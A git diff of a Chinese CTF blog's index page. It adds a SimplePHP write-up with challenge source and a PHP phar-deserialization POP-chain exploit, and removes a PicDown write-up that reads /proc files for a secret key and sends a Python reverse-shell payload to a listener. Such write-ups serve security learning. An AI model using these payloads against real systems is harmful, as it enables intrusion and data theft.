@@ -113,7 +113,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">117</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -131,6 +131,129 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/SWPUCTF-2018-SimplePHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="why">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="why">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | why">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/SWPUCTF-2018-SimplePHP/" class="post-title-link" itemprop="url">[SWPUCTF 2018]SimplePHP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-06-06 21:49:57" itemprop="dateCreated datePublished" datetime="2024-06-06T21:49:57+08:00">2024-06-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-06-07 20:37:24" itemprop="dateModified" datetime="2024-06-07T20:37:24+08:00">2024-06-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606215028319.png" alt="image-20240606215028319"></p>
+<p>点击到查看文件，发现有传参！！！</p>
+<p>file？直接file.php</p>
+<p>查看一下</p>
+<p>file.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">  echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">  $show-&gt;source = $file; </span><br><span class="line">  $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">  die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>function.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//show_source(__FILE__); </span><br><span class="line">include &quot;base.php&quot;; </span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">function upload_file_do() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">    //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">    if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">    echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    if(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file_check() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    if(empty($extension)) &#123; </span><br><span class="line">        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            return true; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是激情澎湃的审计时间，笑死</p>
+<p>慢慢看吧</p>
+<p>不难看出是pop链的题</p>
+<p>这道题就是将对象作为字符串进行跳转</p>
+<p>class.php中</p>
+<p>进入__toString函数之后需要str[‘str’]寻找source函数</p>
+<p>如果找不到就可以跳转__get函数</p>
+<p>但是只有Test类才有__get函数，那么就让str[‘str’]返回的对象为Test对象</p>
+<p>多好啊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后就在Test看看，发现参数</p>
+<p>和get、file_get、file_get_contents</p>
+<p>也就是toString中str触发get函数之后还会接着触发file_get和file_get_contents</p>
+<p>所以，emm</p>
+<p>差不多</p>
+<p>接着就是看看怎么进入toString</p>
+<p>也很简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现str，也就是说，这里可以直接通过destruct进入toString，真不错</p>
+<p>所以我们写脚本生成序列化，将文件写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str[&#x27;str&#x27;] = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;		// 一定要是绝对路径</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new Test;</span><br><span class="line">$b = new Show($c);</span><br><span class="line">$a = new C1e4r($b);</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.jpg&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;__HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>真不错</p>
+<p>生成的phar文件就在脚本文件夹内</p>
+<p>改后缀jpg上传</p>
+<p>之后查看upload</p>
+<p>发现文件</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240607203657813.png" alt="image-20240607203657813"></p>
+<p>之后通过phar伪协议查看即可</p>
+<p>拿到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -997,97 +1120,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def md5(str):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(str.encode(&quot;utf8&quot;))</span><br><span class="line">    return m.hexdigest()</span><br><span class="line"></span><br><span class="line">for i in string.ascii_uppercase:</span><br><span class="line">    for j in string.ascii_uppercase:</span><br><span class="line">        for k in string.ascii_uppercase:</span><br><span class="line">            c = &#x27;TASC&#x27; + i + &#x27;O3RJMV&#x27; + j + &#x27;WDJKX&#x27; + k + &#x27;ZM&#x27;</span><br><span class="line">            x = md5(c).upper()</span><br><span class="line">            if &#x27;E903&#x27; in x and &#x27;4DAB&#x27; in x and &#x27;08&#x27; in x and &#x27;51&#x27; in x and &#x27;80&#x27; in x and &#x27;8A&#x27; in x:</span><br><span class="line">                print(c)</span><br><span class="line">                print(x)</span><br><span class="line">                break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>OK了</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/02/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="why">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="why">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | why">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/06/02/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/" class="post-title-link" itemprop="url">[网鼎杯 2020 白虎组]PicDown</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-06-02 19:24:23 / 修改时间：21:04:13" itemprop="dateCreated datePublished" datetime="2024-06-02T19:24:23+08:00">2024-06-02</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193405974.png" alt="image-20240602193405974"></p>
-<p>不是，你这，我那</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193418102.png" alt="image-20240602193418102"></p>
-<p>这就？</p>
-<p>啊！？</p>
-<p>反正肯定不是预期解，看看真正的解法吧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/cmdline    </span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193613205.png" alt="image-20240602193613205"></p>
-<p>读取app.py，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line">//定义secretkey，然后删除</span><br><span class="line">//但是没有关闭，所以可以在/proc/self/fd/xxx中找到</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line">//定义了一个文件读取的功能</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line">//传两个参数，如果key == SECRET_KEY，那么就可以执行命令，但是没有回显，可以用来反弹shell.</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>所以读取一下key</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>
-
-<p>这数字是一个一个试，试到三就行</p>
-<p>读取到TqaOFuu2Sk29nB9Pc2s5wPKrWv&#x2F;jknWSId5SFyNg7A4&#x3D;</p>
-<p>所以进行shell反弹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=lxzY3xvJIDngLAx7RogcmxYWJX5MOWEKSCyT36xso7k=&amp;shell=python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
-
-<p>反弹之后直接cat就好</p>
 
       
     </div>
